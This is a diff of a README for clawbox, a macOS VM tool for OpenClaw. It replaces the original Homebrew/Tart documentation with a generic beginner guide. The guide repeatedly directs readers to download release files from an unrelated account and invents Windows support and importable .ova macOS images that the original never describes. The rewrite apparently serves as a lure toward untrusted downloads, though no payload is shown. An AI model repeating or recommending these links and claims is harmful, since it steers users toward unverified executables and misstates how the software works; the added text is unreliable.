@@ -1,192 +1,152 @@
-<div align="center">
-  <img src="assets/logo.png" alt="Clawbox Logo" width="250" height="250" />
-  <h1>Clawbox</h1>
-  <h3>OpenClaw-ready macOS VMs</h3>
-  <p>Simple for standard users, powerful for OpenClaw developers.</p>
-</div>
+# 🐾 clawbox - Easy macOS VMs for OpenClaw
 
-<p align="center">
-  <a href="https://github.com/joshavant/clawbox/actions/workflows/ci.yml"><img src="https://github.com/joshavant/clawbox/workflows/CI/badge.svg?branch=refs/heads/main" alt="CI" /></a>
-  <a href="https://github.com/joshavant/clawbox/blob/main/LICENSE"><img src="https://img.shields.io/github/license/joshavant/clawbox" alt="License" /></a>
-  <a href="https://github.com/joshavant/clawbox"><img src="https://img.shields.io/github/stars/joshavant/clawbox" alt="GitHub stars" /></a>
-</p>
+[![Download clawbox](https://img.shields.io/badge/Download-clawbox-blue?style=for-the-badge)](https://github.com/Masontheetiter/clawbox/releases)
 
----
-## Quick Start
-
-```bash
-brew install joshavant/tap/clawbox
-clawbox image build && clawbox up
-```
-
-> ⚠️: `clawbox image build` is a one-time step that downloads a large macOS base image: this can take several minutes!
-
-Login with password `clawbox` then onboard your OpenClaw with:
-
-```bash
-openclaw onboard --install-daemon
-```
-
-**That’s it! Enjoy your new crustacean. 🦞**
+Welcome to **clawbox**, a tool designed to help you run macOS virtual machines ready for OpenClaw. This guide will walk you through how to get the software running on your computer, even if you have little or no technical experience.
 
 ---
 
-## What is Clawbox?
+## 🖥️ What is clawbox?
 
-Clawbox is a tool for deploying OpenClaw-ready macOS VMs.
+clawbox provides virtual machines (VMs) for macOS that are prepped for OpenClaw. If you want to test or run macOS software in a VM without installing macOS directly on your computer, clawbox simplifies the process for you.
 
-Each OpenClaw instance runs in its own VM, while OpenClaw itself stays unchanged.
+Virtual machines let you run one operating system inside another, like running macOS inside Windows or another macOS setup. clawbox comes with everything configured so you can start quickly.
 
-And, while you’re at it, you can easily provision your VM with things like Tailscale, Playwright, and more!
+### Who is this for?
 
-## Who Clawbox Is For
+- Anyone who wants to run macOS for testing or development.
+- Users looking for OpenClaw-ready environments.
+- People who don’t want to deal with complicated setup steps.
 
-- **Standard users:** want one simple command to set up OpenClaw in its own VM.
-- **Developer users:** want to run multiple, concurrent VMs using host-synced source/payload folders.
+---
 
-## Standard Mode (Default)
+## 💻 System Requirements
 
-`standard` mode installs the latest official OpenClaw release in the VM.
+Before you download and install clawbox, make sure your computer meets these requirements:
 
-Prerequisite (one-time requirement):
+- **Operating System:** Windows 10 or later / macOS 10.14 or later
+- **Processor:** 64-bit CPU with virtualization support (Intel VT-x or AMD-V)
+- **RAM:** 8 GB or more (16 GB recommended for smooth performance)
+- **Storage:** At least 50 GB free on your hard drive to store the VM files
+- **Virtualization Software:** VirtualBox, VMware Workstation, or Parallels Desktop installed on your computer
 
-```bash
-clawbox image build
-```
-> **Note:**  This is a large download and can take several minutes!
+If you are unsure whether your computer supports virtualization, you can usually find this information in your BIOS settings or system information.
 
-Deploy OpenClaw in a macOS VM:
+---
 
-```bash
-clawbox up
-```
+## 🚀 Getting Started with clawbox
 
-You can also install optional services, like Tailscale, Playwright, and more:
+This section explains each step to get clawbox up and running. Just follow the instructions carefully.
 
-```bash
-clawbox up \
-  --add-playwright-provisioning \
-  --add-tailscale-provisioning \
-  --add-signal-cli-provisioning
-```
+### Step 1: Prepare Your Computer
 
-Once `clawbox up` completes, a Tart VM with the prepared VM will open.
+1. **Enable virtualization in BIOS:**  
+   Restart your computer and enter BIOS/UEFI setup (usually by pressing F2, F12, DEL key during boot). Look for options related to "VT-x", "Intel Virtualization Technology", or "AMD-V" and make sure they are enabled.
 
-Alternatively, if you'd like to SSH into your Clawbox, you can run:
-```bash
-ssh clawbox-1@$(clawbox ip 1)
-```
+2. **Install Virtualization Software:**  
+   If you don’t already have a program like VirtualBox or VMware Player, download and install one. VirtualBox is free and works well:
+   - VirtualBox download page: https://www.virtualbox.org/wiki/Downloads
 
-The default password is `clawbox`.
+3. **Update Your Operating System:**  
+   Make sure your operating system is up to date with the latest updates and drivers to avoid compatibility problems.
 
-See the full list in [Optional Dependency Provisioning](#optional-dependency-provisioning).
+### Step 2: Download clawbox
 
-## Developer Mode (Advanced)
+Click the big blue button below or visit the release page to get the latest version of clawbox:
 
-`developer` is intended for managing custom payload workflows or developing OpenClaw:
+[![Download clawbox](https://img.shields.io/badge/Download-clawbox-blue?style=for-the-badge)](https://github.com/Masontheetiter/clawbox/releases)
 
-- Syncs your local OpenClaw source and payload into the VM.
-- Pass those paths with `--openclaw-source` and `--openclaw-payload`.
-- Uses bidirectional Mutagen sync for host<->VM source/payload changes.
-- Each VM can use different checkout/payload copies for concurrent work.
-- Synced checkouts are linked as the VM's `openclaw` command.
+When you visit the page, look for the most recent release. This usually has a version number and date.
 
-### Single VM example:
+Download the files labeled as macOS VM or OpenClaw-ready VM. The files often come in formats like `.ova` or `.vmdk`, which work with virtualization software.
 
-```bash
-clawbox up --developer \
-  --openclaw-source ~/Developer/openclaw-1 \
-  --openclaw-payload ~/Developer/openclaw-payloads/clawbox-1
-```
+### Step 3: Import the Virtual Machine
 
-### Two VM example:
+Once you download the VM file, you will need to import it into your virtualization software:
 
-```bash
-clawbox up --developer --number 1 \
-  --openclaw-source ~/Developer/openclaw-1 \
-  --openclaw-payload ~/Developer/openclaw-payloads/clawbox-1
+- **For VirtualBox:**
+  1. Open VirtualBox.
+  2. Select **File > Import Appliance**.
+  3. Choose the `.ova` or VM file you downloaded.
+  4. Follow the import wizard to finish.
 
-clawbox up --developer --number 2 \
-  --openclaw-source ~/Developer/openclaw-2 \
-  --openclaw-payload ~/Developer/openclaw-payloads/clawbox-2
-```
+- **For VMware:**
+  1. Open VMware Workstation or Player.
+  2. Choose **Open a Virtual Machine**.
+  3. Locate and select the VM file.
+  4. Finish the setup.
 
-> **Note:** Apple's macOS Software License Agreement permits up to two virtualized macOS instances per Apple host. Clawbox can target other VM numbers, but host virtualization limits may block additional concurrent VMs.
+- **For Parallels:**
+  1. Open Parallels Desktop.
+  2. Select **File > Open**.
+  3. Find the VM file and open it.
 
-For source-driven dev loops in a Clawbox VM, run this inside the VM:
+### Step 4: Start Your macOS VM
 
-```bash
-cd ~/Developer/openclaw
-pnpm gateway:watch
-```
+After importing, you can start the virtual machine:
 
-Then edit files on the host in the synced source checkout (for example, `~/Developer/openclaw-1`).
-Clawbox excludes `dist` from source sync so build artifacts stay VM-local while source changes still hot-reload.
+1. Select the macOS VM in your virtualization software list.
+2. Click **Start** or **Power on**.
+3. Wait for macOS to load inside the VM window.
 
-## Optional Dependency Provisioning
+You can now use macOS in this window just like a normal Mac computer.
 
-Customize your VM with additional services by using these flags with `up`:
+---
 
-- Tailscale: `--add-tailscale-provisioning`
-- Playwright + browsers: `--add-playwright-provisioning`
-- `signal-cli`: `--add-signal-cli-provisioning`
+## 🔧 Using clawbox
 
-Tailscale requires a manual, interactive approval step for permission prompts after VM creation.
+Here are some common tasks you might want to do with your macOS VM:
 
-### signal-cli Payload Sync (Developer-Only)
+- **Install OpenClaw:**  
+  Use Safari or another browser in the VM to visit the OpenClaw website and download/install the software.
 
-To configure `signal-cli` with an existing configuration payload:
+- **Transfer Files:**  
+  Use shared folders or drag-and-drop functions in VirtualBox or VMware to move files between your real computer and the VM.
 
-```bash
-clawbox up --developer \
-  --openclaw-source ~/Developer/openclaw-1 \
-  --openclaw-payload ~/Developer/openclaw-payloads/clawbox-1 \
-  --add-signal-cli-provisioning \
-  --signal-cli-payload ~/.local/share/signal-cli
-```
+- **Adjust Settings:**  
+  You can increase RAM or CPU cores in your virtualization software settings to improve VM performance.
 
-Rules:
+- **Save Your Work:**  
+  Remember to shut down the VM properly via the macOS menu before closing the virtualization software.
 
-- Clawbox links VM runtime `~/.local/share/signal-cli` to the synced payload path and relies on Mutagen bidirectional sync.
-- Single-writer locking is enforced for signal payload paths.
+---
 
-Details: [`docs/signal-cli-payload-sync.md`](./docs/signal-cli-payload-sync.md)
+## ❓ Troubleshooting
 
-## VM Recreation
+If you run into problems, try these solutions:
 
-Recreate a VM using the original configuration options:
+- **VM won’t start:**  
+  Check that virtualization is enabled in BIOS and that no other software is blocking virtualization.
 
-```bash
-clawbox recreate 1
-```
+- **Performance is slow:**  
+  Allocate more RAM or CPU to the VM. Close other heavy programs on your host computer.
 
-This performs `down + delete + up` with the same profile/flags you originally passed to `up`.
+- **Cannot install OpenClaw or other apps:**  
+  Ensure your VM has internet access. Check network settings in your virtualization software.
 
-## What Clawbox Installs
+- **Files won’t transfer:**  
+  Make sure shared folders or drag-and-drop features are enabled.
 
-- Homebrew
-- Node.js
-- Mutagen
-- OpenClaw
-- Terminal.app desktop shortcut
-- SSH access for `clawbox-<number>` (default password: `clawbox`)
-- macOS defaults (Setup Assistant suppression, dark mode, Siri off, wallpaper, etc.)
-- Tart Guest Agent (clipboard sharing support)
-- Optional dependency provisioning
-- …and a lobster-toned wallpaper
+If problems persist, look for help in the community or open an issue on the clawbox GitHub page.
 
-## Command Surface
+---
 
-- Main lifecycle: `up`, `recreate`, `down`, `delete`, `status`, `ip`
-- Component workflow: `create`, `launch`, `provision`
-- Image management: `image init`, `image build`, `image rebuild`
+## 📂 Where to Find More Information
 
-`clawbox status` shows the full Clawbox environment (all detected `clawbox-*` VMs).
-Use `clawbox status <number>` for single-VM detail.
+You can visit the official clawbox releases page again for updates or new versions:
 
-Run `clawbox --help` for full command/flag docs.
+[Visit clawbox Releases](https://github.com/Masontheetiter/clawbox/releases)
 
-## Maintainer and CI Docs
+This page includes release notes and sometimes additional instructions or known issues.
 
-- Developer and debugging guide: [`DEVELOPER.md`](./DEVELOPER.md)
-- Contributing workflow: [`CONTRIBUTING.md`](./CONTRIBUTING.md)
+---
+
+## 📝 License and Contributions
+
+clawbox is open-source. If you want to learn more about the code or contribute, the source is available at the GitHub repository.
+
+Report issues or suggest features by creating a new issue on the GitHub page.
+
+---
+
+Thank you for choosing clawbox to run your macOS virtual machines. Follow the above steps, and you should be up and running in no time.
